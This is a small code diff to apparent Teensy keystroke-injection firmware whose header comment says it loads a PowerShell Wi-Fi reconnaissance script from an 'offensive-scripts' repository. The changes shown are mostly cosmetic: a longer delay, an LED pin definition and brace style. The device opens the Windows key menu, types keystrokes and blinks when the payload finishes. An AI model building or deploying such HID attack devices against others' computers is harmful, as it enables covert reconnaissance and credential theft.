@@ -4,14 +4,10 @@
  * powershell script loaded: https://github.com/timebotdon/offensive-scripts/Windows/wifirecon.ps1
 */
 
-int ds = 500;
+int ds = 1000;
+int LED_PIN = 13;
 
-#if defined(CORE_TEENSY)
-#define LED_PIN 13
-#endif
-
-void setup()
-{
+void setup() {
   pinMode(LED_PIN, OUTPUT);
   delay(2000);
   Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
@@ -28,8 +24,7 @@ void setup()
   Keyboard.send_now();
 }
 
-void loop()
-{
+void loop() {
   // Blink when payload runtime is complete
   digitalWrite(LED_PIN, HIGH);
   delay(ds/2);
